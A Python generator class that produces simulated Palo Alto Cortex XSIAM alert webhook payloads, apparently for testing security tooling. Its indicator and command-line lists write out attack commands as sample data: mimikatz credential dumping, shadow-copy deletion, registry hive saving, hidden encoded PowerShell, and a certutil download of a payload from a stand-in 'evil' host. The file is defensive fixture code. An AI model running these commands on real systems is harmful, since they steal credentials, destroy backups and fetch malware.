"""Palo Alto Cortex XSIAM — Alert webhook/forwarding payload format.

Cortex XSIAM forwards alerts to external SOAR/webhook targets via:
Management Console → Settings → Integrations → Alert Forwarding → Webhook

Official format reference:
https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-API-Reference/Get-Alerts
https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-Administrator-Guide/Alert-Forwarding
"""
import random
from backend.engine.generators.base import BaseGenerator


class XSIAMGenerator(BaseGenerator):
    product_name = "Palo Alto Cortex XSIAM"
    product_category = "xdr"

    ALERT_NAMES = [
        "XQL - Suspicious PowerShell Execution",
        "Behavioral - Credential Dumping via LSASS",
        "Network - C2 Beaconing Detected",
        "Malware - Ransomware File Encryption",
        "XQL - Lateral Movement via WMI",
        "Behavioral - Suspicious Process Injection",
        "Network - DNS Tunneling Activity",
        "Malware - Cryptominer Detected",
        "Behavioral - Defense Evasion via LOLBin",
        "Network - Data Exfiltration Detected",
        "Vulnerability - Exploitation of CVE",
        "Identity - Brute Force on Service Account",
    ]

    CATEGORIES = [
        "Malware", "Network", "Behavioral", "XQL", "Vulnerability",
        "Identity", "Exploit", "Reconnaissance",
    ]

    BIOC_INDICATORS = [
        "powershell.exe -WindowStyle Hidden -EncodedCommand",
        "mimikatz.exe sekurlsa::logonpasswords",
        "cmd.exe /c net use \\\\dc01\\c$",
        "certutil.exe -urlcache -split -f",
        "wmic.exe process call create",
        "reg.exe save HKLM\\SYSTEM",
        "vssadmin.exe delete shadows",
        "schtasks.exe /create /tn UpdateTask",
    ]

    FW_TYPES = ["lan", "wan", "vpn", "ha", "loopback", "unknown"]

    VENDORS = ["Palo Alto Networks", "Microsoft", "Google", "Amazon", "CrowdStrike"]

    PROTOCOLS = ["TCP", "UDP", "ICMP", "DNS", "HTTP", "HTTPS", "SMB", "RDP", "SSH"]

    MATCHING_STATUSES = ["MATCHED", "PARTIAL", "NO_MATCH"]

    ALERT_SOURCES = ["XDR Agent", "Cortex Analytics", "Network Events",
                     "Identity Analytics", "Third Party", "Manual"]

    def generate(self) -> dict:
        severity = self._pick_severity()
        technique_id, technique_name = self._pick_technique()
        host = self._pick_host()
        user = self._pick_user()
        src_ip = self._pick_ip()
        dst_ip = self._pick_ip()

        # XSIAM uses uppercase severity values
        sev_map = {
            "critical": "CRITICAL", "high": "HIGH",
            "medium": "MEDIUM", "low": "LOW",
        }

        alert_id = self._uuid().replace("-", "")[:18]
        now_ts = int(__import__("time").time() * 1000)

        tactic_map = {
            "T1059": "Execution", "T1566": "Initial Access", "T1078": "Defense Evasion",
            "T1021": "Lateral Movement", "T1053": "Persistence", "T1027": "Defense Evasion",
            "T1105": "Command and Control", "T1071": "Command and Control", "T1486": "Impact",
            "T1547": "Persistence", "T1003": "Credential Access", "T1055": "Defense Evasion",
            "T1218": "Defense Evasion", "T1036": "Defense Evasion", "T1482": "Discovery",
            "T1087": "Discovery", "T1046": "Discovery", "T1190": "Initial Access",
            "T1133": "Initial Access",
        }
        tactic_prefix = technique_id.split(".")[0]
        tactic = tactic_map.get(tactic_prefix, "Execution")
        tactic_id = f"TA{random.randint(1000, 1012)}"

        # XSIAM alert forwarding payload format
        return {
            "alerts": [
                {
                    "alert_id": alert_id,
                    "name": random.choice(self.ALERT_NAMES),
                    "description": self._pick_title(severity),
                    "category": random.choice(self.CATEGORIES),
                    "severity": sev_map[severity],
                    "host_name": host,
                    "host_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "actor_effective_username": user,
                    "actor_process_image_name": random.choice([
                        "powershell.exe", "cmd.exe", "rundll32.exe", "wscript.exe",
                        "mshta.exe", "certutil.exe", "regsvr32.exe",
                    ]),
                    "action_process_image_name": random.choice([
                        "lsass.exe", "services.exe", "svchost.exe",
                        "explorer.exe", "csrss.exe",
                    ]),
                    "action_process_image_sha256": "".join(random.choices("0123456789abcdef", k=64)),
                    "action_process_image_command_line": random.choice([
                        "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgA",
                        "cmd.exe /c whoami && net user administrator",
                        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
                        "certutil.exe -urlcache -split -f http://evil.example.com/payload.exe",
                    ]),
                    "source_ip": src_ip,
                    "destination_ip": dst_ip,
                    "source_port": random.randint(1024, 65535),
                    "destination_port": random.choice([80, 443, 8080, 8443, 4444, 1337, 53, 445]),
                    "protocol": random.choice(self.PROTOCOLS),
                    "event_timestamp": self._now_iso(),
                    "alert_timestamp": self._now_iso(),
                    "detection_timestamp": self._now_iso(),
                    "device_name": host,
                    "vendor": "Palo Alto Networks",
                    "product": "XSIAM",
                    "tags": [f"technique:{technique_id}", f"severity:{severity}", "simulated"],
                    "bioc_indicator": random.choice(self.BIOC_INDICATORS),
                    "mitre_technique_id_and_name": f"{technique_id} - {technique_name}",
                    "mitre_tactic_id_and_name": f"{tactic_id} - {tactic}",
                    "matching_status": random.choice(self.MATCHING_STATUSES),
                    "end_match_attempt_ts": now_ts,
                    "detector_id": f"cortex_xsiam_{alert_id[:8]}",
                    "alert_source": random.choice(self.ALERT_SOURCES),
                    "fw_type": random.choice(self.FW_TYPES),
                    "fw_interface_from": "ethernet1/1",
                    "fw_interface_to": "ethernet1/2",
                    "xdr_url": f"https://yourtenant.xsiam.paloaltonetworks.com/alerts/{alert_id}",
                }
            ],
            "metadata": {
                "alert_count": 1,
                "forwarded_at": self._now_iso(),
                "source_tenant": "yourtenant.xsiam.paloaltonetworks.com",
            },
        }
